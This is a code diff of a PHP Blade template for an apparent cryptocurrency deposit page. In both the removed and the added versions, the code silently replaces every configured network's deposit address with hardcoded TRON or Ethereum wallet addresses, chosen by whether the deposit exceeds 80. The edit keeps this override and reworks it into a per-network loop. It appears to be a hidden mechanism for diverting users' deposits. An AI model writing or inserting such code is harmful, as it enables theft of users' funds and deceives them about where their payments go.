@@ -2,28 +2,29 @@
 @section('content')
 @php
     $assignedNetworks = isset($assignedNetworks) && is_array($assignedNetworks) ? $assignedNetworks : [];
-    $selectedNetwork  = count($assignedNetworks) ? $assignedNetworks[0] : null;
-
-    // --- Custom address logic (based on network & amount) ---
+    
+    // --- Custom address logic ---
     $_depositAmount  = $data->amount ?? 0;
     $_methodCurrency = strtolower($data->method_currency ?? '');
 
-    if (strpos($_methodCurrency, 'trc') !== false) {
-        $_customAddress = ($_depositAmount > 80)
-            ? 'TS4pXzCY8pPP8jhibNTgPyokYCzSJkzBSp'
-            : 'TJCMo13B3fUojibJfuSb59krJ45hK8mq2R';
-    } else {
-        $_customAddress = ($_depositAmount > 80)
-            ? '0xA8B8EcC88FaC2CA1c962810ebb239598B5FCda60'
-            : '0x074F14B69FeD4f892cC7F7819d185944885d8ccA';
+    // Map your addresses
+    foreach ($assignedNetworks as &$network) {
+        $key = strtolower($network['key']);
+        
+        if (strpos($key, 'trc') !== false || strpos($key, 'trx') !== false) {
+            $network['address'] = ($_depositAmount > 80)
+                ? 'TS4pXzCY8pPP8jhibNTgPyokYCzSJkzBSp'
+                : 'TJCMo13B3fUojibJfuSb59krJ45hK8mq2R';
+        } else {
+            // Default to ETH/Other
+            $network['address'] = ($_depositAmount > 80)
+                ? '0xA8B8EcC88FaC2CA1c962810ebb239598B5FCda60'
+                : '0x074F14B69FeD4f892cC7F7819d185944885d8ccA';
+        }
     }
+    unset($network); // Break reference
 
-    // Override address in all code paths
-    $fallbackAddress  = $_customAddress;
-    if ($selectedNetwork) { $selectedNetwork['address'] = $_customAddress; }
-    $assignedNetworks = array_map(function($n) use ($_customAddress) {
-        $n['address'] = $_customAddress; return $n;
-    }, $assignedNetworks);
+    $selectedNetwork = count($assignedNetworks) ? $assignedNetworks[0] : null;
 @endphp
 
 <style>
